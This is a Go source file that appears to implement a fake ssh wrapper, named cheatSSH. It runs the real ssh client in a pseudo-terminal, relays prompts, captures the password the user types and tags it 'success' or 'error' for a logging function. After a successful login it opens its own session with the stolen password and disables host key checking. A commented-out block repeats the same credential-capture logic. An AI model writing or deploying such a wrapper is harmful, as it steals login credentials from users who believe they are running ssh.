package main

import (
	"fmt"
	"github.com/google/goterm/term"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
)

var SSHFirstTime = regexp.MustCompile(`\[fingerprint\]`)
var SSHIgnore = regexp.MustCompile("not a terminal")
var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)`)
var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
var SSHSuccess = regexp.MustCompile(`Welcome to`)
var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)

func cheatSSH() string {
	var pty, _ = term.OpenPTY()
	var password string
	var writeMsg = make(chan struct{})
	var readLock = make(chan struct{})
	var AskPass bool

	c := exec.Command("ssh", os.Args[1:]...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	c.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true}
	c.Start()

	go func() {
		for {
			<-writeMsg
			password = getPassword()
			pty.Master.WriteString(password + "\r\n")
		}

	}()
	var lineByte []byte
	var line string
	go func() {
		for {
			v, err := pty.ReadByte()
			if err != nil || v == 0 {
				//fmt.Println("out2")
				readLock <- struct{}{}
				return
			}

			lineByte = append(lineByte, v)
			line = string(lineByte)
			//fmt.Println(line,line[len(line)-1])

			if SSHIfFirst.MatchString(line) {
				AskPass = true
			}
			if AskPass && SSHFirstTime.MatchString(line) && strings.HasSuffix(line, "?") {
				fmt.Print(line)

				var input string
				fmt.Scanln(&input)
				pty.Master.WriteString(input + "\r")
				line = ""
				lineByte = nil
			}

			//逐行输出
			if v == 13 || v == 10 {
				if !AskPass && !SSHAsk.MatchString(line) && !SSHFirstTime.MatchString(line) && strings.TrimSpace(line) != "" {
					//fmt.Println("out")
					readLock <- struct{}{}
					return
				}

				//判断密码是否正确
				if password != "" && strings.TrimSpace(line) != "" {
					if failAuthRE.MatchString(line) {
						writePassword(password + " error")
						password = ""
					} else {
						//fmt.Print(line)
						writePassword(password + " success")
						c.Process.Kill()
						readLock <- struct{}{}
						return
					}
				}
				fmt.Print(line)
				lineByte = nil
				line = ""
			}
			//询问密码语句输出
			if line != "" && SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
				AskPass = true
				fmt.Print(line)
				lineByte = nil
				line = ""
				writeMsg <- struct{}{}
				//去除输入的换行符
				pty.ReadByte()
			}
		}
	}()
	c.Wait()
	pty.Close()
	<-readLock

	if AskPass && password != "" {
		startSSHShell(password)
	}
	if !AskPass && password == "" {
		execScript(cmd)
	}
	return password
}
func startSSHShell(password string) {
	var user, ip, port string
	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	portRE := regexp.MustCompile(`-p\s+(\d+)`)
	portInfo := portRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	if len(info[0]) == 3 {
		user = info[0][1]
		ip = info[0][2]
	} else {
		return
	}
	if len(portInfo) == 0 {
		port = "22"
	} else if len(portInfo[0]) == 2 {
		port = portInfo[0][1]
	} else {
		return
	}
	client, err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	checkErr(err)
	session, err := client.NewSession()
	defer session.Close()
	fd := int(os.Stdin.Fd())
	oldState, err := terminal.MakeRaw(fd)
	checkErr(err)
	defer terminal.Restore(fd, oldState)
	// 拿到当前终端文件描述符
	termWidth, termHeight, err := terminal.GetSize(fd)
	// request pty
	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
	checkErr(err)
	// 对接 std
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin

	err = session.Shell()
	err = session.Wait()

}

//func cheatSSH()(bool,string){
//	inputArg := strings.Join(os.Args[1:]," ")
//	var pass []byte
//	var b = make([]byte,1024)
//	e,_,err := expect.Spawn("ssh "+inputArg,-1)
//	if err != nil{
//		return true,""
//	}
//	defer e.Close()
//	time.Sleep(time.Second)
//	e.Read(b)
//	text := string(b)
//	textLen := len(strings.Split(strings.TrimSpace(text),"\n"))
//	firstTime := strings.Contains(text,"fingerprint")
//	if textLen > 1 && !strings.Contains(text,"not a terminal") && !firstTime{
//		return true,""
//	}
//	ok,_ := regexp.Match("assword.*:",b)
//	if !ok && !firstTime{
//		return true,""
//	}
//	if firstTime{
//		fmt.Print(text)
//		var answer string
//		fmt.Scanln(&answer)
//		if strings.Contains(strings.ToLower(answer),"n"){
//			return false,""
//		}
//		e.Send("yes\r\n")
//		text,_,_ = e.Expect(passRE,-1)
//	}
//	fmt.Print(text)
//	pass,_ = gopass.GetPasswd()
//	e.Send(string(pass)+"\r\n")
//	time.Sleep(sshWaitTime)
//	for i:=0;i<3;i++ {
//		var inputflag = false
//		output, _, _ := e.Expect(anyRE, -1)
//		if strings.Contains(output, "try again") {
//			inputflag = true
//			writePassword(string(pass) + " error")
//			fmt.Print(output)
//			if !strings.Contains(output,"assword"){
//				output,_,_ = e.Expect(passRE,-1)
//				fmt.Print(output)
//			}
//		}else if strings.Contains(output,"Welcome"){
//			if !strings.Contains(output,"Last login"){
//				output,_,_ = e.Expect(regexp.MustCompile("Last login"),-1)
//				fmt.Print(output)
//			}
//			writePassword(string(pass)+" success")
//
//			return true,string(pass)
//		}else{
//			writePassword(string(pass) + " error")
//			fmt.Print(output)
//			return false,""
//		}
//		if inputflag{
//			pass,_ = gopass.GetPasswd()
//			e.Send(string(pass)+"\r\n")
//			time.Sleep(sshWaitTime)
//		}
//	}
//	return true,string(pass)
//}
//func startSSHShell(password string){
//	var user,ip,port string
//	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
//	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args," "),1)
//	portRE := regexp.MustCompile(`-p\s+(\d+)`)
//	portInfo := portRE.FindAllStringSubmatch(strings.Join(os.Args," "),1)
//	if len(info[0]) == 3{
//		user = info[0][1]
//		ip = info[0][2]
//	}else{
//		return
//	}
//	if len(portInfo) == 0{
//		port = "22"
//	}else if len(portInfo[0]) == 2{
//		port = portInfo[0][1]
//	}else{
//		return
//	}
//	client,err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
//		User:            user,
//		Auth:            []ssh.AuthMethod{ssh.Password(password)},
//		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
//	})
//	checkErr(err)
//	session, err := client.NewSession()
//	defer session.Close()
//	fd := int(os.Stdin.Fd())
//	oldState, err := terminal.MakeRaw(fd)
//	checkErr(err)
//	defer terminal.Restore(fd, oldState)
//	// 拿到当前终端文件描述符
//	termWidth, termHeight, err := terminal.GetSize(fd)
//	// request pty
//	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
//	checkErr(err)
//	// 对接 std
//	session.Stdout = os.Stdout
//	session.Stderr = os.Stderr
//	session.Stdin = os.Stdin
//
//	err = session.Shell()
//	err = session.Wait()
//}
